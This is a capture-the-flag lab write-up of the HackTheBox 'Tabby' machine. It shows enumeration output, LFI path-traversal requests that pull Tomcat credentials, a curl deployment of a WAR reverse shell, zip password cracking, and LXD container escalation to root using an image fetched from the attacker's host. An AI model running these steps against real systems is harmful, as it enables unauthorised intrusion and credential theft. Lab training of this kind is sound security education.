# what I learned
- READ the documment
- dont know how stuff works? install in and find out
- use whatever shell you need to use to gain foothold then spawn pty shell
- tomcat
- lxd/lxc privexc


# Enumeration
## nmap
```console
kali@kali:~$ sudo python3 pymap.py -t tabby.htb
[sudo] password for kali: 
created by gu2rks/kurohat 
find me here https://github.com/gu2rks

port scanning...
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
9999/tcp open  abyss
Enumerating open ports...
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-28 10:34 EDT
Nmap scan report for tabby.htb (10.10.10.194)
Host is up (0.038s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
9999/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.2)
|_http-server-header: SimpleHTTP/0.6 Python/3.8.2
|_http-title: Directory listing for /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   37.62 ms 10.10.14.1
2   38.07 ms tabby.htb (10.10.10.194)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
```

## Port 80 Web directory discovering
- email: ```sales@megahosting.htb```
- http://tabby.htb/news.php?file=statement : look like **LFI** here let make sure about it

```console
kali@kali:~$ wfuzz -c -u http://tabby.htb/FUZZ.FUZ2Z -w /usr/share/SecLists/Discovery/Web-Content/big.txt -z list,txt-php-html -t 100 --hc 404

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://tabby.htb/FUZZ.FUZ2Z
Total requests: 61419

===================================================================
ID           Response   Lines    Word     Chars       Payload                           
===================================================================

000000045:   403        9 L      28 W     274 Ch      ".htaccess - html"                
000000046:   403        9 L      28 W     274 Ch      ".htpasswd - txt"                 
000000043:   403        9 L      28 W     274 Ch      ".htaccess - txt"                 
000000044:   403        9 L      28 W     274 Ch      ".htaccess - php"                 
000000047:   403        9 L      28 W     274 Ch      ".htpasswd - php"                 
000000048:   403        9 L      28 W     274 Ch      ".htpasswd - html"                
000003043:   200        35 L     237 W    1574 Ch     "Readme - txt"                    
000028688:   200        373 L    938 W    14175 Ch    "index - php"                     
000037634:   200        0 L      0 W      0 Ch        "news - php"                      

Total time: 161.2014
Processed Requests: 61419
Filtered Requests: 61410
Requests/sec.: 381.0077
ali@kali:~$ gobuster dir -t50 -u tabby.htb -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tabby.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/06/28 11:13:44 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/Readme.txt (Status: 200)
/assets (Status: 301)
/favicon.ico (Status: 200)
/files (Status: 301)
/index.php (Status: 200)
/news.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/06/28 11:15:07 Finished
===============================================================
kali@kali:~$ gobuster dir -t50 -u tabby.htb/files -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tabby.htb/files
[+] Threads:        50
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php
[+] Timeout:        10s
===============================================================
2020/06/28 11:15:37 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/archive (Status: 301)
/statement (Status: 200)
===============================================================
2020/06/28 11:16:50 Finished
===============================================================
```
so something like this:
|/files/
   /archive/
   /statement/


seem like we have LFI on *new.php* (```http://tabby.htb/news.php?file=FILE```) and it is confirmed when after enumerating web. The content of ```http://tabby.htb/files/statment/``` is the same content as ```http://tabby.htb/news.php?file=statement```.



## port 8080 Apache Tomcat
- tell us where the user password can be found (```tomcat_users.xml```)
- running tomcat9
- Users are defined in */etc/tomcat9/tomcat-users.xml*.
- Tomcat is installed with **CATALINA_HOME** in */usr/share/tomcat9* and **CATALINA_BASE** in */var/lib/tomcat9*,
- Document


# Foothold
## Local file inclusion (LFI)


So far I did some "random" request and try to get ```tomcat-users.xml``` (such as, */etc/tomcat9/tomcat-users.xml*.) but none of them works. To be more accurate we can download tomcat9 and check find out where the .xml is located.

```console
kali@kali:~$ sudo apt-get install tomcat9
kali@kali:~$ find / -type f -name "tomcat-users.xml" 2>/dev/null
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
```


now use LFI to access the .xml
- http://tabby.htb/news.php?file=../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
- http://tabby.htb/news.php?file=../../../../../../../../../../etc/tomcat9/tomcat-users.xml


One of this link will get you tomcat cerdential. **Dont let empty page full you!!!** check *network -> response* here is what you will find
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="Password" roles="admin-gui,manager-script"/>
</tomcat-users>
```

## implant reverse shell
We know that tomcat has a role as **manager-script**, we will try to use this role and exploit tomcat manager.
I found this [article](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/). There is many way to do but it seem like there is only one way that we can exploit the machine. which is us **Tomcat manager remote deploy script**


after some digging I found [this](https://martin.podval.eu/2013/10/tomcat-7-remote-deployment.html) and [this](https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script). Here is what we need to do 
1. use curl to upload our .war shell script and deploy it
2. open netcat, listen
3. execute our .war shell and get foodhold on the machine.


let start with create .war shell using `msfvenom`. We can find the location that .war shell should be upload to on the [document](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html). check Deploy A New Application Archive (WAR) Remotely.
```console
curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file kurohat.war "http://tabby.htb:8080/manager/text/deploy?path=/kurohat"
OK - Deployed application at context path [/kurohat]
```
now execute .war by visit *http://tabby.htb:8080/kurohat/*


mfsvenom shell.war sucks let use pty shell
```console
which python
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")' # spawn pty shell
```
## User privilage
check home directory of Tomcat and Apache. I found `16162020_backup.zip` in Apache home directory ```/var/www/html/```. Python simplehttpserver were use to tranfer the file from the box to kali. Now in Kali
```console
root@kali:/home/kali/HTB/tabby# zip2john 16162020_backup.zip > output.txt
root@kali:/home/kali/HTB/tabby# john --wordlist=/usr/share/wordlists/rockyou.txt output.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSWORD         (16162020_backup.zip)
1g 0:00:00:01 DONE (2020-06-28 11:36) 0.8000g/s 8290Kp/s 8290Kc/s 8290KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
The password optained from cracked the zip file is possible to be password which **ash** (user) use.

I then try to ```ssh ash@tabby.htb``` but it didnt work seem like tabby is only allow plubic key authentication. I then decided to use ```su``` to gain access to **ash**. 
```console
tomcat@tabby:/var/lib/tomcat9$ su ash
su ash
Password: PASSWORD
ash@tabby:/var/lib/tomcat9$ cd
cd
ash@tabby:~$ ls
ls
user.txt
```


# root privillage
now time for privesc to gain root access. I try to check *SUID*, *cronjob* and ```ps aux``` not thing really intersting there. I then check ash's group by running ```id```
```console
ash@tabby:/var/lib/tomcat9$ id    
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

as you can see ash is in *lxd group*, we can use lxd or lxc to gain root. how to do that? read [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation) or [here](https://reboare.github.io/lxd/lxd-escape.html). the 2nd links demonstrate expliant the process clearly, so check it out.


in general if the user is a member of lxd group = green card to root. this is what need to be done:
1. Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
2. Build alpine => bash build-alpine (as root user) [Attacker Machine]
3. import image to LXD
4. create container
5. mount host filesystem
6. Run a shell inside the container and get flag



In kali
```console 
kali@kali:~/HTB/tabby$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine # download build-alpine
kali@kali:~/HTB/tabby$ chmod 777 build-alpine
kali@kali:~/HTB/tabby$ sudo ./build-alpine  # build it
```
now when you ```ls``` you will find now apline.tar.gz which is our image. again, use simplehttpserver to host the imgae


go back to tabby and download the image 
```console
ash@tabby:~$ wget http://<kali ip>:<port>/alpine-v3.12-x86_64-20200629_1413.tar.gz # download the image
<15.83:<port>/alpine-v3.12-x86_64-20200629_1413.tar.gz
--2020-06-29 19:04:40--  http://<kali ip>:<port>/alpine-v3.12-x86_64-20200629_1413.tar.gz
Connecting to <kali ip>:<port>... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3199162 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200629_1413.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   3.05M  1.05MB/s    in 2.9s    

2020-06-29 19:04:43 (1.05 MB/s) - ‘alpine-v3.12-x86_64-20200629_1413.tar.gz’ saved [3199162/3199162]

ash@tabby:~$ lxc image import alpine-v3.12-x86_64-20200629_1413.tar.gz --alias kurohat # import the image in lxd
<e-v3.12-x86_64-20200629_1413.tar.gz --alias kurohat
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

ash@tabby:~$ lxc image list # check if the image is imported
lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| kurohat | d2bd0fb4704c | no     | alpine v3.12 (20200629_14:13) | x86_64       | CONTAINER | 3.05MB | Jun 29, 2020 at 7:05pm (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
ash@tabby:~$ lxc init kurohat mycontainer -c security.privileged=true # create container
lxc init kurohat mycontainer -c security.privileged=true
Creating mycontainer
ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true # mount the host file system
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
ash@tabby:~$ lxc start mycontainer # start the container 
lxc start mycontainer
ash@tabby:~$ lxc exec mycontainer /bin/sh # use the container to execute shell
lxc exec mycontainer /bin/sh
~ # whoami  
whoami
root
~ # cat /mnt/root/root/root.txt
```